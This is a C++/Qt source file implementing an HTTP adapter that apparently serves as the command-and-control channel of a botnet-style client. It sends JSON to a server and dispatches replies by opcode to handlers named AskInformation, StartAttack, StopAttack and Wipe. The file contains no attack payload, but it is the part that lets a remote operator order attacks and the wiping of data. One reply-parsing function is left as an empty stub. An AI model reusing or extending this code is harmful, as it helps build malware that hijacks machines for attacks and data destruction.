#include <QByteArray>
#include <QJsonDocument>
#include <QNetworkRequest>
#include <Windows.h>

#include "../../Utilities/logging.h"
#include "../Messages/Server/askinformationmessage.h"
#include "../Messages/Server/startattackmessage.h"
#include "../Messages/Server/stopattackmessage.h"
#include <QMetaEnum>

#include "../Messages/Server/wipemessage.h"
#include "httpserveradapter.h"

using namespace network::messages::client;
using namespace network::messages::server;
using namespace utilities;

namespace network { namespace http
{
    QMap<ServerOpcode, std::function<std::shared_ptr<ServerMessage>(QJsonObject&)>> HttpServerAdapter::serverMapper_ =
    {
        { ServerOpcode::AskInformation, AskInformationMessage::fromJson },
        { ServerOpcode::StartAttack, StartAttackMessage::fromJson },
        { ServerOpcode::StopAttack, StopAttackMessage::fromJson },
        { ServerOpcode::Wipe, WipeMessage::fromJson }
    };

    std::unique_ptr<ServerMessage> HttpServerAdapter::createMessageFromReply(QNetworkReply *reply)
    {
        std::unique_ptr<ServerMessage> message = nullptr;

        return message;
    }

    HttpServerAdapter::HttpServerAdapter()
        : network_(this)
    {
        connect(&network_, SIGNAL(finished(QNetworkReply*)), this, SLOT(onRequestFinished(QNetworkReply*)));
    }

    void HttpServerAdapter::send(ClientMessage& message)
    {
        QNetworkRequest request(apiUrl_);
        request.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");

        QByteArray data = QJsonDocument(message.toJson()).toJson();

        QNetworkReply* reply = network_.post(request, data);

        Logging::get().info(
                    QString("SEND %1 (0x%2)")
                    .arg(message.metaObject()->className())
                    .arg(QString::number((int)message.opcode(), 16))
                    , LoggingType::Network);
    }

    void HttpServerAdapter::onRequestFinished(QNetworkReply *reply)
    {
        if(reply->error() == QNetworkReply::NoError)
        {
            emit serverReplied();

            QByteArray text = reply->readAll();

            QJsonObject json = QJsonDocument::fromJson(text).object();
            ServerOpcode opcode = (ServerOpcode) json.value("opcode").toInt();

            if(serverMapper_.contains(opcode))
            {
                auto message = serverMapper_.value(opcode)(json);

                Logging::get().info(QString("RECEIVE %1 (0x%2)")
                              .arg(message->metaObject()->className())
                              .arg((int)message->opcode())
                              , LoggingType::Network);

                emit receive(message);
            }
        }

        // Mark the reply as ready to be deleted
        reply->deleteLater();
    }
}}
